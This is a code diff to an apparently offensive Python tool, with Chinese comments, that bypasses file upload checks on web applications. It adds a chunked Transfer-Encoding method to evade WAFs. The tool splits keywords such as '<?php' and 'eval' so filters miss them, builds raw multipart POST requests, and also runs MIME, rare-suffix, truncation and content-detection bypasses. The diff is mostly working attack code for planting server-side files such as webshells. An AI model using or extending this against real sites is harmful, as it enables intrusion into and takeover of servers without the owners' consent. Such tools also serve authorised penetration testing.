@@ -41,12 +41,11 @@ class General:
         :return:
         '''
         self.prepare()   # 设置通用参数
-        p1 = self.mimeBypass()   # MIME绕过
-        c1 = self.Comman.checkResult(self.initUrls, p1)
-        self.end(check=c1, stop=self.stop)
+        self.mimeBypass()   # MIME绕过
         self.rareSuffixBypass()  # 同义后缀名绕过
         self.truncatedBypass()  # 截断上传绕过
         self.confuseBypass()    # 文件内容检测绕过
+        self.chunkBypass()     # 分块传输绕waf
         self.end(stop=True)
         return
 
@@ -81,10 +80,6 @@ class General:
         return
 
 
-    def fuzzHeaders(self, headers, key, value):
-        # 混淆headers
-        headers[key] = value
-        return headers
 
     def fuzzRareSuffix(self, suffix, filename):
         # 替换后缀名
@@ -135,7 +130,9 @@ class General:
         print(blue('[ Info ]') + fuchsia('指定MIME为:') + cyan(self.p_ct))
         files = self.setFiles(self.args.field, file=self.p_file, ct=self.p_ct)
         res = self.Comman.upload(self.args.u, files, data=self.data)
-        return res
+        check = self.Comman.checkResult(self.initUrls, res)
+        self.end(check=check, stop=self.stop)
+        return
 
     def rareSuffixBypass(self):
         '''
@@ -210,10 +207,27 @@ class General:
         分块传输绕waf
         :return:
         '''
+        print(blue('[ schedule ]') + cyan('尝试分块传输上传绕waf'))
         blackwords = [   # 拆分单词，自行完善
             '<?php', 'phpinfo()', 'eval'
         ]
-        file_data = open(self.p_file, 'rb').read()   # 文件内容
+        try:
+            print(blue('[ Info ]') + fuchsia('绕过姿势:') + cyan('分块传输'))
+            body = self.gen_body()   # 构造body
+            cd = chunk_data(body, blackwords)   # 构造chunk数据包
+            raw = self.genChunkRaw(self.args.u, cd)   # 构造完整请求体
+        except:
+            print(red('[ Error ]') + yellow('构造chunk数据包失败'))
+            return
+        try:
+            hack = HackRequests.hackRequests()   # 调用发包API
+            r = hack.httpraw(raw)    # 发包
+            print(blue('[ upload ]') + fuchsia('状态码:') + green(r.status_code))
+            check = self.Comman.checkResult(self.initUrls, r.text())
+            self.end(check=check, stop=self.stop)
+        except Exception as e:
+            print(yellow('[ Warn ]') + e)
+        return
 
 
 
@@ -313,7 +327,7 @@ class General:
             print(red('[ Error ]') + yellow('读取文件失败'))
             sys.exit()
 
-    def genChunkRaw(self, url, raw_data, cookies=''):
+    def genChunkRaw(self, url, body):
         # 构造chunk请求体
         host = url.split('://')[-1].split('/')[0]
         if url.startswith('http'):
@@ -321,6 +335,10 @@ class General:
         else:
             scheme = 'HTTP'
         path = url.split(host)[-1]
+        if self.args.c != None:
+            cookies = self.args.c
+        else:
+            cookies = ''
 
         raw = '''
 POST /{path} {scheme}/1.1
@@ -335,14 +353,49 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 Cookies: {cookies}
 Transfer-Encoding: Chunked
 
-{data}
+{body}
         '''.format(
             scheme=scheme,
             host=host,
             path=path,
-            data=raw_data,
+            body=body,
             cookies=cookies
         )
-        print(raw)
         return raw
+
+    def gen_body(self):
+        # 构造请求体
+        boundary = '------WebKitFormBoundary3xCzmJioizRcn0t4'
+        form = ''
+        if self.data != {}:
+            for x in self.data:
+                form += \
+                """
+{boundary}
+Content-Disposition: form-data; name="{key}"
+
+{value}""".format(
+                    boundary=boundary,
+                    key=x,
+                    value=self.data[x]
+                )
+
+        body = \
+            """
+{boundary}
+Content-Disposition: form-data; name="{field}"; filename="{filename}"
+Content-Type: {ct}
+
+{data}
+
+{form}
+{boundary}""".format(
+                boundary=boundary,
+                field=self.args.field,
+                filename=self.p_filename,
+                ct=self.p_ct,
+                data=open(self.p_file, 'rb').read(),   # 文件内容
+                form=form
+            )
+        return body
 
